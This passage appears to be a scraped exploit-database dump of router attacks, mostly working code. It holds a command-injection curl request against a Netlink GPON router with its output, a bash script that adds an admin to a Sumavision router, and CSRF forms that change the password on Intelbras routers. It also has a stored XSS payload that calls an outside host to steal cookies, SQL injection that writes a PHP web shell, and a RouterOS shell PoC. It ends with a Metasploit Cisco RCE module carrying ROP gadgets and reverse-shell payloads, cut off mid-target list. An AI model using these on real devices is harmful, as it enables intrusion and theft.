Cache-Control: no-cache, no-store, max-age=0, must-revalidate
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Date: Fri, 01 Jan 2010 09:14:47 GMT
Connection: Keep-Alive
Content-Language: en
Content-Type: application/javascript
Content-Length: 141
while(1); /*{""DeviceName"":""HG630
V2"",""SerialNumber"":""T5D7S18815905395"",""ManufacturerOUI"":""00E0FC"",""UpTime"":33288,""HardwareVersion"":""VER.B""}*/
You can use that serial number to login to the router."
2020-03-18,WebApps,Hardware,shellord,Netlink GPON Router 1.0.11,Remote Code Execution,"# Exploit Title: Netlink GPON Router 1.0.11 - Remote Code Execution
# Date: 2020-03-17
# Exploit Author: shellord
# Vendor Homepage: https://www.netlink-india.com/
# Version: 1.0.11
# Tested on: Windows 10
# CVE: N/A
http://TARGETIP/boaform/admin/formPing","Exploit :
curl -L -d ""target_addr=;ls /&waninf=1_INTERNET_R_VID_154""
Response :
<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">
<!--ϵͳĬģ-->
<html>
<head>
<title>PINGԽ</title>
<meta http-equiv=pragma content=no-cache>
<meta http-equiv=refresh content=""2"">
<meta http-equiv=cache-control content=""no-cache, must-revalidate"">
<meta http-equiv=content-type content=""text/html; charset=gbk"">
<meta http-equiv=content-script-type content=text/javascript>
<!--ϵͳcss-->
<style type=text/css>
@import url(/style/default.css);
</style>
<!--ϵͳű-->
<script language=""javascript"" src=""common.js""></script>
</head>
<!--ҳ-->
<body topmargin=""0"" leftmargin=""0"" marginwidth=""0"" marginheight=""0""
alink=""#000000"" link=""#000000"" vlink=""#000000"">
<blockquote>
<form>
<div align=""left"" style=""padding-left:20px;""><br>
<div align=""left""><b>Finish</b>
<br><br>
</div>
<pre>
bin
dev
etc
home
image
lib
mnt
proc
sbin
sys
tmp
usr
var
</pre>
<input type=button value=""back""
onClick=window.location.replace(""/diag_ping_admin_en.asp"")>
</div>
</form>
</blockquote>
</body>
</html>"
2020-03-16,WebApps,ASP,Miguel Mendez Z,Enhanced Multimedia Router 3.0.4.27,Cross-Site Request Forgery (Add Admin),"# Exploit Title: Enhanced Multimedia Router 3.0.4.27 - Cross-Site Request Forgery (Add Admin)
# Date: 2020-03-05
# Exploit Author: Miguel Mendez Z.
# Vendor Homepage: www.sumavision.com
# Software Link: http://www.sumavision.com/ensite/i.php?id=29
# Version: EMR 3.0.4.27
# CVE : CVE-2020-10181
https://github.com/s1kr10s/Sumavision_EMR3.0/blob/master/exploit_sumavision.sh","-----------------------Exploit Bash---------------------------
echo """"
read -p ""Set Hostname: "" host
read -p ""Set username: "" user
echo ""(The password should be between 6 and 32 in length)""
read -p ""Set password: "" pass
echo
echo ""[+] creating user...""
sleep 2
postdata=$(curl -X POST -d ""type=11&cmd=3&language=0&slotNo=255&setString=$user<*1*>administrator<*1*>$pass"" ""http://$host/goform/formEMR30"" -s | grep -i ""0"")
if echo ""$postdata"" | grep -q ""0</html>""; then
echo ""[+] http://$host/frame_en.asp""
echo ""[+] created access($user - $pass)""
else
echo ""[-] user not created""
fi
Reference:"
2019-12-16,WebApps,Hardware,Sanyam Chawla,D-Link DIR-615 Wireless Router , Persistent Cross-Site Scripting,"# Exploit Title: D-Link DIR-615 Wireless Router  -  Persistent Cross-Site Scripting
# Date: 2019-12-13
# Exploit Author: Sanyam Chawla
# Vendor Homepage: http://www.dlink.co.in
# Category: Hardware (Wi-fi Router)
# Hardware Link: http://www.dlink.co.in/products/?pid=678
# Hardware Version: T1
# Firmware Version: 20.07
# Tested on: Windows 10 and Kali linux
# CVE: CVE-2019-19742
#Burp Intercept","Reproduction Steps:
1. Login to your wi-fi router gateway with admin credentials [i.e: http://192.168.0.1]
2. Go to Maintenance page and click on Admin on the left panel
3. Put blind xss Payload in to the name field “><script src=https://ptguy.xss.ht></script>. This payload saved by the server and its reflected in the user page.
4. Every refresh in the user home page, the blind XSS payload executes and sends data (IP, cookies, victim user agent) to the attacker.
5. For HTML injection just put <b> Testing </b> in username field, you will get the username bold in your homepage.
POST /form2userconfig.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0)
Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/userconfig.htm
Cookie: SessionID=
Upgrade-Insecure-Requests: 1
username=*%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fptguy.xss.ht
<http://2Fptguy.xss.ht>%3E%3C%2Fscript%3E*&privilege=2&newpass=pentesting&confpass=pentesting&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
2019-12-03,WebApps,Hardware,Prof. Joas Antonio,Intelbras Router RF1200 1.1.3,Cross-Site Request Forgery,"# Exploit Title: Intelbras Router RF1200 1.1.3 - Cross-Site Request Forgery
# Date: 2019-11-06
# Exploit Author: Joas Antonio
# Vendor Homepage: intelbras.com.br
# Software Link: https://www.intelbras.com/pt-br/roteador-wireless-smart-dual-band-action-rf-1200
# Version: 1.1.3 (REQUIRED)
# Tested on: Windows
# CVE : CVE-2019-19516
#POC1:","<html>
<body>
<form method=""POST"" action=""http://IPROUTERRF1200/login/Auth"">
<input type=""hidden"" name=""username"" value=""admin""/>
<input type=""hidden"" name=""password"" value=""21232f297a57a5a743894a0e4a801fc3""/> <!-- password admin -->
<input type=""submit"" value=""Submit"">
</form>
</body>
<html>"
2019-11-05,WebApps,PHP,cakes,html5_snmp 1.11,'Router_ID' SQL Injection,"# Exploit Title: html5_snmp 1.11 - 'Router_ID' SQL Injection
# Date: 2019-11-01
# Exploit Author: Cakes
# Vendor Homepage: https://github.com/lolypop55/html5_snmp
# Software Link: https://github.com/lolypop55/html5_snmp.git
# Version: 1.11
# Tested on: CentOS 7
# CVE: N/A
# PoC for error, time, boolean and Union based SQL Injection
# Parameter: Router_ID (POST)
# Type: error-based
# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
# Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
# Type: time-based blind
# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
# Parameter: Router_IP (GET)
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause
# Vector: AND [INFERENCE]
# Type: time-based blind
# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
# Type: UNION query
# Title: Generic UNION query (NULL) - 5 columns
# Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
# Pop a Shell :-)","Payload: Router_ID=123' AND (SELECT 9724 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(9724=9724,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'aJYp'='aJYp&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save
Payload: Router_ID=123' AND (SELECT 7074 FROM (SELECT(SLEEP(5)))hDkA) AND 'koRt'='koRt&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save
Payload: Router_IP=192.168.0.1' AND 3390=3390-- yUHk
Payload: Router_IP=192.168.0.1' AND (SELECT 2831 FROM (SELECT(SLEEP(5)))SwFp)-- VukE
Payload: Router_IP=192.168.0.1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a787071,0x4f4f4e6c58704e78566b76576358564c4e5145575543435658706d4e50476d6a6c65505366497571,0x7170717671),NULL-- BEdT
GET /get_router_show.php?Router_IP=%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%30%78%33%33%63%33%66%37%30%36%38%37%30%32%30%32%34%36%33%36%64%36%34%32%30%33%64%32%30%37%33%36%38%36%35%36%63%36%63%35%66%36%35%37%38%36%35%36%33%32%38%32%34%35%66%34%37%34%35%35%34%35%62%32%37%36%33%36%64%36%34%32%37%35%64%32%39%33%62%32%30%36%35%36%33%36%38%36%66%32%30%32%34%36%33%36%64%36%34%33%62%32%30%33%66%33%65%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%20%49%4e%54%4f%20%44%55%4d%50%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%73%6e%6d%70%30%31%2f%75%70%6c%6f%61%64%73%2f%65%78%65%63%2e%70%68%70%27%2d%2d%20%44%52%74%66 HTTP/1.1
Host: Target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://Target/get_router.php
Cookie: PHPSESSID=ii1kfjgplci8vbfep3ius67353
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0"
2019-10-31,Remote,Hardware,Jacob Baines,MikroTik RouterOS 6.45.6,DNS Cache Poisoning,"# Exploit Title: MikroTik RouterOS 6.45.6 - DNS Cache Poisoning
# Date: 2019-10-30
# Exploit Author: Jacob Baines
# Vendor Homepage: https://mikrotik.com/
# Software Link: https://mikrotik.com/download
# Version: 6.45.6 Stable (and below) or 6.44.5 Long-term (and below)
# Tested on: Various x86 and MIPSBE RouterOS installs
# CVE : CVE-2019-3978
# Writeup: https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21
# Disclosure: https://www.tenable.com/security/research/tra-2019-46
# Unauthenticated DNS request via Winbox
# RouterOS before 6.45.7 (stable) and 6.44.6 (Long-term) allowed an unauthenticated remote user trigger DNS requests
# to a user specified DNS server via port 8291 (winbox). The DNS response then gets cached by RouterOS, setting up
# a perfect situation for unauthenticated DNS cache poisoning. This is assigned CVE-2019-3978.
# This PoC takes a target ip/port (router) and a DNS server (e.g. 8.8.8.8).
# The PoC will always send a DNS request for example.com. In the following write up,
# I detail how to use this to poison the routers cache:
# https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21
# Note that the writup focuses on router's configured *without* the DNS server enabled.
# Obviously this attack is significantly more powerful when downstream clients use the router as a DNS server.
## What are the build dependencies?
# This requires:
# * Boost 1.66 or higher
# * cmake
## How do I build this jawn?
# Just normal cmake. Try this:
# ```sh
# mkdir build
# cd build
# cmake ..
# make
# ```
# Resolve dependencies as needed.
## Usage Example
# ```sh
# albinolobster@ubuntu:~/routeros/poc/winbox_dns_request/build$ ./winbox_dns_request -i 192.168.1.50 -p 8291 -s 8.8.8.8
# -> {bff0005:1,u1:134744072,uff0006:1,uff0007:3,s3:'example.com',Uff0001:[14]}
# <- {u4:584628317,uff0003:2,uff0006:1,s3:'example.com',U6:[584628317],U7:[21496],Uff0001:[],Uff0002:[14],S5:['example.com']}
# albinolobster@ubuntu:~/routeros/poc/winbox_dns_request/build$ ssh admin@192.168.1.50
# ...
# [admin@MikroTik] > ip dns cache print
# Flags: S - static
# #   NAME                               ADDRESS                                                              TTL
# 0   example.com                        93.184.216.34                                                        5h57m57s
# [admin@MikroTik] >
# ```
# Source:
# https://github.com/tenable/routeros/tree/master/poc/winbox_dns_request
#include <fstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>
#include ""winbox_session.hpp""
#include ""winbox_message.hpp""
//{u3:1047,ufe0001:0,uff0007:655463,r2:[115],Uff0001:[76],Uff0002:[0,456]}","Copyright 2019 Tenable, Inc
Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.
3. Neither the name of the copyright holder nor the names of its contributors
may be used to endorse or promote products derived from this software
without specific prior written permission.
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.
namespace
const char s_version[] = ""CVE-2019-3943 PoC Using SNMP dlopen"";
bool parseCommandLine(int p_argCount, const char* p_argArray[],
std::string& p_username, std::string& p_password,
std::string& p_ip, std::string& p_port)
boost::program_options::options_description description(""options"");
description.add_options()
(""help,h"", ""A list of command line options"")
(""version,v"", ""Display version information"")
(""username,u"", boost::program_options::value<std::string>(), ""The user to log in as"")
(""password"", boost::program_options::value<std::string>(), ""The password to log in with"")
(""port,p"", boost::program_options::value<std::string>()->default_value(""8291""), ""The Winbox port to connect to"")
(""ip,i"", boost::program_options::value<std::string>(), ""The IPv4 address to connect to"");
boost::program_options::variables_map argv_map;
try
boost::program_options::store(
boost::program_options::parse_command_line(
p_argCount, p_argArray, description), argv_map);
catch (const std::exception& e)
std::cerr << e.what() << ""\n"" << std::endl;
std::cerr << description << std::endl;
return false;
boost::program_options::notify(argv_map);
if (argv_map.empty() || argv_map.count(""help""))
std::cerr << description << std::endl;
return false;
if (argv_map.count(""version""))
std::cerr << ""Version: "" << ::s_version << std::endl;
return false;
if (argv_map.count(""username"") && argv_map.count(""ip"") &
argv_map.count(""port""))
p_username.assign(argv_map[""username""].as<std::string>());
p_ip.assign(argv_map[""ip""].as<std::string>());
p_port.assign(argv_map[""port""].as<std::string>());
if (argv_map.count(""password""))
p_password.assign(argv_map[""password""].as<std::string>());
else
p_password.assign("""");
return true;
else
std::cerr << description << std::endl;
return false;
int main(int p_argc, const char** p_argv)
std::string username;
std::string password;
std::string ip;
std::string port;
if (!parseCommandLine(p_argc, p_argv, username, password, ip, port))
return EXIT_FAILURE;
Winbox_Session winboxSession(ip, port);
if (!winboxSession.connect())
std::cerr << ""Failed to connect to the remote host"" << std::endl;
return EXIT_FAILURE;
boost::uint32_t p_session_id = 0;
if (!winboxSession.login(username, password, p_session_id))
std::cerr << ""[-] Login failed."" << std::endl;
return false;
WinboxMessage msg;
msg.set_to(0x4c);
msg.set_command(0xa0065);
msg.set_request_id(1);
msg.set_reply_expected(true);
msg.add_u32(5,80); // height
msg.add_u32(6,24); // width
msg.add_u32(8,1);  // controls method. 0 (nova/bin/login), 1 (telnet), 2 (ssh), 3 (mactel), 4 (nova/bin/telser), default...
msg.add_string(0x0a, username); //username
msg.add_string(1,"""");
msg.add_string(7, ""vt102"");
msg.add_string(9, ""-l a""); // drop into telnet client shell
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""Error receiving a response."" << std::endl;
return EXIT_FAILURE;
if (msg.has_error())
std::cout << ""error: "" << msg.get_error_string() << std::endl;
boost::uint32_t session_id = msg.get_u32(0xfe0001);
msg.reset();
msg.set_to(0x4c);
msg.set_command(0xa0068);
msg.set_request_id(2);
msg.set_reply_expected(true);
msg.add_u32(5,82);
msg.add_u32(6,24);
msg.add_u32(0xfe0001, session_id);
winboxSession.send(msg);
boost::uint32_t tracker = 0;
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""Error receiving a response."" << std::endl;
return EXIT_FAILURE;
msg.reset();
msg.set_to(0x4c);
msg.set_command(0xa0067);
msg.set_request_id(3);
msg.set_reply_expected(true);
msg.add_u32(3, tracker);
msg.add_u32(0xfe0001, session_id);
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""Error receiving a response."" << std::endl;
return EXIT_FAILURE;
if (msg.has_error())
std::cout << msg.serialize_to_json() << std::endl;
std::cout << ""error: "" << msg.get_error_string() << std::endl;
return EXIT_FAILURE;
else if (!msg.get_raw(0x02).empty())
std::string raw_payload(msg.get_raw(0x02));
tracker += raw_payload.size();
msg.reset();
msg.set_to(0x4c);
msg.set_command(0xa0067);
msg.set_request_id(4);
msg.set_reply_expected(true);
msg.add_u32(3, tracker);
msg.add_u32(0xfe0001, session_id);
msg.add_raw(2, ""set tracefile /pckg/option\n"");
winboxSession.send(msg);
bool found_telnet_prompt = false;
while (!found_telnet_prompt)
msg.reset();
if (!winboxSession.receive(msg))
std::cerr << ""Error receiving a response."" << std::endl;
return EXIT_FAILURE;
if (msg.has_error())
std::cout << msg.serialize_to_json() << std::endl;
std::cout << ""error: "" << msg.get_error_string() << std::endl;
return EXIT_FAILURE;
else if (!msg.get_raw(0x02).empty())
std::string raw_payload(msg.get_raw(0x02));
if (raw_payload.find(""telnet> "") != std::string::npos)
std::cout << ""Success!"" << std::endl;
found_telnet_prompt = true;
return EXIT_SUCCESS;"
2019-10-28,WebApps,Hardware,Prof. Joas Antonio,Intelbras Router WRN150 1.0.18,Cross-Site Request Forgery,# PoC1: https://www.youtube.com/watch?v=V188HHDMbGM&feature=youtu.be,"Exploit Title: Intelbras Router WRN150 1.0.18 - Cross-Site Request Forgery
Date: 2019-10-25
Exploit Author: Prof. Joas Antonio
Vendor Homepage: https://www.intelbras.com/pt-br/
Software Link: http://en.intelbras.com.br/node/25896
Version: 1.0.18
Tested on: Windows
CVE : N/A
<html>
<body>
<form action=""http://10.0.0.1/goform/SysToolChangePwd"" method=""POST"">
<input type=""hidden"" name=""GO"" value=""system_password.asp"">
<input type=""hidden"" name=""SYSPSC"" value=""0"">
<input class=""text"" type=""password"" name=""SYSOPS"" value=""hack123""/>
<input class=""text"" type=""password"" name=""SYSPS"" value=""mrrobot""/>
<input class=""text"" type=""password"" name=""SYSPS2"" value=""mrrobot""/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>"
2019-10-11,WebApps,Hardware,Prof. Joas Antonio,Intelbras Router WRN150 1.0.18,Persistent Cross-Site Scripting,"# Exploit Title: Intelbras Router WRN150 1.0.18 - Persistent Cross-Site Scripting
# Date: 2019-10-03
# Exploit Author: Prof. Joas Antonio
# Vendor Homepage: https://www.intelbras.com/pt-br/
# Software Link: http://en.intelbras.com.br/node/25896
# Version: 1.0.18
# Tested on: Windows
# CVE : CVE-2019–17411
# PoC 1:
# PoC burp.txt","1) Login to your router
2) After signing in as WAN Settings
3) Select for PPPOE mode
4) In the Service Name and Server Name field, enter any of these payloads:
<script> alert (""Hacked"") </script>
<script> alert (1) </script>
POST /goform/AdvSetWan HTTP/1.1
Host: TARGET
Content-Length: 281
Cache-Control: max-age=0
Origin: http://TARGET
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://TARGET/wan_connected.asp
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ecos_pw=bWFkYXJhMTIxMQ==2dw:language=pt
Connection: close"
2019-09-03,Remote,Hardware,Metasploit,Cisco RV110W/RV130(W)/RV215W Routers Management Interface,Remote Command Execution (Metasploit),"# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# linux/armle/meterpreter/bind_tcp -> segfault
# linux/armle/meterpreter/reverse_tcp -> segfault
# linux/armle/meterpreter_reverse_http -> works
# linux/armle/meterpreter_reverse_https -> works
# linux/armle/meterpreter_reverse_tcp -> works
# linux/armle/shell/bind_tcp -> segfault
# linux/armle/shell/reverse_tcp -> segfault
# linux/armle/shell_bind_tcp -> segfault
# linux/armle/shell_reverse_tcp -> segfault
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# gadget 1 is in /usr/lib/libcrypto.so
# RV110W 1.1.0.9, 1.2.0.9, 1.2.0.10, 1.2.1.4, 1.2.1.7
# RV215W 1.1.0.5, 1.1.0.6, 1.2.0.14, 1.2.0.15, 1.3.0.7, 1.3.0.8
# We fingerprint devices using SHA1 hash of a web resource accessible to unauthenticated users.
# We use lang_pack/EN.js because it's the one file that changes the most between versions.
# Note that it's not a smoking gun given that some branches keep the exact same files in /www
# (see RV110 branch 1.2.1.x/1.2.2.x, RV130 > 1.0.3.22, RV215 1.2.0.x/1.3.x)
# Given there is no process continuation here, the httpd server will stop
# functioning properly and we need to take care of proper restart
# ourselves.","class MetasploitModule < Msf::Exploit::Remote
Rank = GoodRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
include Msf::Exploit::Deprecated
moved_from 'exploit/linux/http/cisco_rv130_rmi_rce'
def initialize(info = {})
super(update_info(info,
'Name'           => 'Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution',
'Description'    => %q{
A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall,
Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router
could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.
The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.
A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
system of the affected device as a high-privilege user.
RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.
RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.
Note: successful exploitation may not result in a session, and as such,
on_new_session will never repair the HTTP server, leading to a denial-of-service condition.
'Author'         =>
'Yu Zhang', # Initial discovery (GeekPwn conference)
'Haoliang Lu', # Initial discovery (GeekPwn conference)
'T. Shiomitsu', # Initial discovery (Pen Test Partners)
'Quentin Kaiser <kaiserquentin@gmail.com>' # Vulnerability analysis & exploit dev
'License'         => MSF_LICENSE,
'Platform'        =>  %w[linux],
'Arch'            =>  [ARCH_ARMLE, ARCH_MIPSLE],
'SessionTypes'    =>  %w[meterpreter],
'CmdStagerFlavor' => %w{ wget },
'Privileged'      => true, # BusyBox
'References'      =>
['CVE', '2019-1663'],
['BID', '107185'],
['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex'],
['URL', 'https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/']
'DefaultOptions' => {
'WfsDelay' => 10,
'SSL' => true,
'RPORT' => 443,
'CMDSTAGER::FLAVOR' => 'wget',
'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',
'Targets'        =>
[ 'Cisco RV110W 1.1.0.9',
'offset'              => 69,
'libc_base_addr'      => 0x2af06000,
'libcrypto_base_addr' => 0x2ac01000,
'system_offset'       => 0x00050d40,
'got_offset'          => 0x0009d560,
'gadget1'             => 0x00167c8c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV110W 1.2.0.9',
'offset'              => 69,
'libc_base_addr'      => 0x2af08000,
'libcrypto_base_addr' => 0x2ac03000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x00167c4c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV110W 1.2.0.10',
'offset'              => 69,
'libc_base_addr'      => 0x2af09000,
'libcrypto_base_addr' => 0x2ac04000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV110W 1.2.1.4',
'offset'              => 69,
'libc_base_addr'      => 0x2af54000,
'libcrypto_base_addr' => 0x2ac4f000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV110W 1.2.1.7',
'offset'              => 69,
'libc_base_addr'      => 0x2af98000,
'libcrypto_base_addr' => 0x2ac4f000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV130/RV130W < 1.0.3.45',
'offset'          => 446,
'libc_base_addr'  => 0x357fb000,
'system_offset'   => 0x0004d144,
'gadget1'         => 0x00020e79, # pop {r2, r6, pc};
'gadget2'         => 0x00041308, # mov r0, sp; blx r2;
'Arch'            => ARCH_ARMLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/armle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.1.0.5',
'offset'              => 69,
'libc_base_addr'      => 0x2af59000,
'libcrypto_base_addr' => 0x2ac54000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.1.0.6',
'offset'              => 69,
'libc_base_addr'      => 0x2af59000,
'libcrypto_base_addr' => 0x2ac54000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.2.0.14',
'offset'              => 69,
'libc_base_addr'      => 0x2af5f000,
'libcrypto_base_addr' => 0x2ac5a001,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.2.0.15',
'offset'              => 69,
'libc_base_addr'      => 0x2af5f000,
'libcrypto_base_addr' => 0x2ac5a000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x00098db0,
'gadget1'             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.3.0.7',
'offset'              => 77,
'libc_base_addr'      => 0x2afeb000,
'libcrypto_base_addr' => 0x2aca5000,
'system_offset'       => 0x0004c7e0,
'got_offset'          => 0x000a0530,
'gadget1'             => 0x00057bec, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
[ 'Cisco RV215W 1.3.0.8',
'offset'              => 77,
'libc_base_addr'      => 0x2afee000,
'libcrypto_base_addr' => 0x2aca5000,
'system_offset'       => 0x0004c7e0,
